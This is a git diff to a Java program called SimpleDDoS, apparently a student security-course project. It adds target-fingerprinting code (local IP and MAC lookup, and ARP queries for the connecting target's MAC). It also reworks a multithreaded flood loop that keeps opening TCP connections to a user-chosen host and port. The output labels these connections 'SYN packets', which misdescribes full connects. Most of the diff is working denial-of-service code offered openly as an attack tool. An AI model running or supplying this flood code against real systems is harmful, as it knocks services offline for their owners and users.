@@ -4,9 +4,14 @@ import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
+import java.net.Inet4Address;
 import java.net.InetAddress;
+import java.net.InetSocketAddress;
+import java.net.NetworkInterface;
 import java.net.ServerSocket;
 import java.net.Socket;
+import java.net.SocketException;
+import java.util.Enumeration;
 import java.util.Scanner;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
@@ -16,8 +21,12 @@ public class SimpleDDoS {
 
     private static final AtomicBoolean attackRunning = new AtomicBoolean(false);
     private static ExecutorService executorService;
-    private static boolean isClientConnected = false;
-    private static Socket clientSocket = null;
+    private static boolean isTargetConnected = false;
+    private static Socket TargetSocket = null;
+
+    private static final int[] ports = {80, 8080, 9000, 135, 445, 902, 912,
+        5040, 49664, 49665, 49666, 49667, 49668, 49669,
+        49670, 49671, 49672, 49673, 49674, 49675, 49676, 49677};
 
     public static void main(String[] args) {
 
@@ -43,14 +52,14 @@ public class SimpleDDoS {
             System.out.println("Source Code: https://github.com/NTVuong23/BMTT/tree/BMTT");
             System.out.println("\n");
 
-            System.out.println("===== Main Menu =====");
-
             try {
                 server();
             } catch (IOException e) {
                 System.out.println("Error starting server: " + e.getMessage());
             }
+            System.out.println("\n");
 
+            System.out.println("====== Main Menu ======");
             System.out.println("1. Start DDoS Attack");
             System.out.println("2. Exit");
             System.out.print("Select an option: ");
@@ -74,18 +83,33 @@ public class SimpleDDoS {
 
     private static void server() throws IOException {
 
-        if (isClientConnected) {
+        if (isTargetConnected) {
             System.out.println("A client is already connected. No need to reconnect.");
             return;
         }
-
-        int[] ports = {80, 8080, 9000, 135, 445, 902, 912, 5040, 49664, 49665, 49666, 49667, 49668, 49669, 49670, 49671, 49672, 49673, 49674, 49675, 49676, 49677};
         ServerSocket ss = null;
 
         for (int port : ports) {
             try {
                 ss = new ServerSocket(port);
-                System.out.println("Port(Server): " + port + "... Waiting for connection from client...");
+                var myInfo = """
+                +----------------------------------
+                |            My Info               
+                +----------------------------------
+                | IP: %s           
+                | Port: %d                         
+                """.formatted(getMyIp(), port);
+
+                String myMac = getMyMac();
+                if (myMac != null) {
+                    myInfo += "| MAC: " + myMac + "        \n";
+                } else {
+                    myInfo += "| MAC Address not found for server. \n";
+                }
+
+                myInfo += "----------------------------------";
+                System.out.println(myInfo);
+                System.out.println("\nWaiting for connection from client...");
                 break;
             } catch (IOException e) {
                 System.out.println("Port: " + port + " not available, trying another port...");
@@ -96,17 +120,120 @@ public class SimpleDDoS {
             return;
         }
 
-        clientSocket = ss.accept();
-        isClientConnected = true;
+        TargetSocket = ss.accept();
+        isTargetConnected = true;
         System.out.println("Client connected.");
+        System.out.println("\n");
 
-        InetAddress clientAddress = clientSocket.getInetAddress();
-        System.out.println("IP: " + clientAddress.getHostAddress());
-
-        InputStreamReader in = new InputStreamReader(clientSocket.getInputStream());
+        InetAddress targetAddress = TargetSocket.getInetAddress();
+        InputStreamReader in = new InputStreamReader(TargetSocket.getInputStream());
         BufferedReader bf = new BufferedReader(in);
         String str = bf.readLine();
-        System.out.println("Client: " + str);
+        var targetInfo = """
+                +----------------------------------
+                |            Target Info               
+                +----------------------------------
+                | IP: %s      
+                | %s
+                """.formatted(targetAddress.getHostAddress(), str);
+
+        String targetMac = getTargetMAC(targetAddress.getHostAddress());
+        if (targetMac != null) {
+            targetInfo += "| MAC: " + targetMac + "        \n";
+        } else {
+            targetInfo += "| MAC Address not found for target. \n";
+        }
+
+        targetInfo += "----------------------------------";
+        System.out.println(targetInfo);
+    }
+
+    public static String getTargetMAC(String targetIp) {
+        try {
+            ProcessBuilder processBuilder = new ProcessBuilder("arp", "-n", targetIp);
+            processBuilder.redirectErrorStream(true);
+            Process process = processBuilder.start();
+
+            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            String line;
+            while ((line = reader.readLine()) != null) {
+                if (line.contains(targetIp)) {
+                    String[] parts = line.trim().split("\\s+");
+                    for (String part : parts) {
+                        if (part.matches("([0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2}")) {
+                            return part;
+                        }
+                    }
+                }
+            }
+            process.waitFor();
+        } catch (IOException | InterruptedException e) {
+            System.err.println("Error executing ARP command: " + e.getMessage());
+        }
+        return "MAC Address not found";
+    }
+
+    public static String getMyIp() {
+        try {
+            Enumeration<NetworkInterface> networkInterfaces = NetworkInterface.getNetworkInterfaces();
+            while (networkInterfaces.hasMoreElements()) {
+                NetworkInterface networkInterface = networkInterfaces.nextElement();
+                if (networkInterface.isUp()) {
+                    Enumeration<InetAddress> inetAddresses = networkInterface.getInetAddresses();
+                    while (inetAddresses.hasMoreElements()) {
+                        InetAddress address = inetAddresses.nextElement();
+                        if (address instanceof Inet4Address && !address.isLoopbackAddress()) {
+                            return address.getHostAddress();
+                        }
+                    }
+                }
+            }
+        } catch (SocketException e) {
+            System.err.println("Unable to get local IP address.");
+            e.printStackTrace();
+        }
+        return null;
+    }
+
+    public static String getMyMac() {
+        try {
+            String os = System.getProperty("os.name").toLowerCase();
+            String command;
+
+            if (os.contains("win")) {
+                command = "getmac";
+            } else {
+                command = "ifconfig -a";
+            }
+
+            ProcessBuilder processBuilder = new ProcessBuilder(command.split(" "));
+            processBuilder.redirectErrorStream(true);
+            Process process = processBuilder.start();
+
+            BufferedReader reader = new BufferedReader(
+                    new InputStreamReader(process.getInputStream()));
+            String line;
+            while ((line = reader.readLine()) != null) {
+                if (os.contains("win")) {
+                    if (line.contains("Physical")) {
+                        String[] parts = line.trim().split("\\s+");
+                        return parts[1];
+                    }
+                } else {
+                    if (line.contains("ether")) {
+                        String[] parts = line.trim().split("\\s+");
+                        return parts[1];
+                    }
+                }
+            }
+
+            process.waitFor();
+
+        } catch (IOException | InterruptedException e) {
+            System.err.println("Error executing command to get MAC address: " + e.getMessage());
+        }
+
+        return null;
     }
 
     private static void startDDoSAttack(Scanner scanner) {
@@ -144,14 +271,16 @@ public class SimpleDDoS {
     private static void performAttack(String targetHost, int targetPort) {
         try {
             while (attackRunning.get()) {
-                try (Socket socket = new Socket(targetHost, targetPort)) {
-                    OutputStream out = socket.getOutputStream();
-                    out.write(("GET / HTTP/1.1\r\nHost: " + targetHost + "\r\n\r\n").getBytes());
-                    out.flush();
-                    System.out.println("Sent request to " + targetHost + ":" + targetPort);
+                try {
+                    try (Socket socket = new Socket()) {
+                        socket.connect(new InetSocketAddress(targetHost, targetPort));
+                        System.out.println("Sent SYN packet to " + targetHost + ":" + targetPort);
+
+                        Thread.sleep(10); 
+                    }
                 } catch (IOException e) {
                     if (attackRunning.get()) {
-                        System.out.println("Error sending request: " + e.getMessage());
+                        System.out.println("Error sending SYN packet: " + e.getMessage());
                     }
                 }
             }
@@ -198,7 +327,7 @@ public class SimpleDDoS {
             System.out.print("Enter target port (default 80): ");
             String input = scanner.nextLine();
             if (input.isEmpty()) {
-                return 80; 
+                return 80;
             }
             try {
                 int port = Integer.parseInt(input);
@@ -222,7 +351,7 @@ public class SimpleDDoS {
             try {
                 int threads = Integer.parseInt(input);
                 if (threads > 0) {
-                    return threads; 
+                    return threads;
                 }
                 System.out.println("Thread count must be greater than 0.");
             } catch (NumberFormatException e) {
